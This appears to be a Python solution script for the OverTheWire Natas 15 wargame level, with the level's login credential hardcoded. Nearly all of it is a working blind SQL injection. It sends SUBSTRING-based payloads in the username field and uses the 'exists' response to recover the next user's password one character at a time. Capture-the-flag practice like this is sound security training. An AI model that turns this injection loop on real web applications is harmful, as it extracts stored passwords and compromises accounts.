import requests


user = "natas15"
password ="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
charsTest = "TUVWXYZ"
payload = {'username': 'Natas16" AND BINARY SUBSTRING(PASSWORD, 1, 1) = "W" AND ""="'}

guess = ""


for i in range(1,64):
    for char in chars:
        search = """Natas16" AND BINARY SUBSTRING(PASSWORD, {0}, 1) = "{1}" AND ""=" """.format(i, char)
        payload = {'username': search}

        req = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug=true',
            auth = (user, password),
            data = payload,
            )

        if "exists" in req.content:
            guess += char
            print("Guess is currently: {}".format(guess))



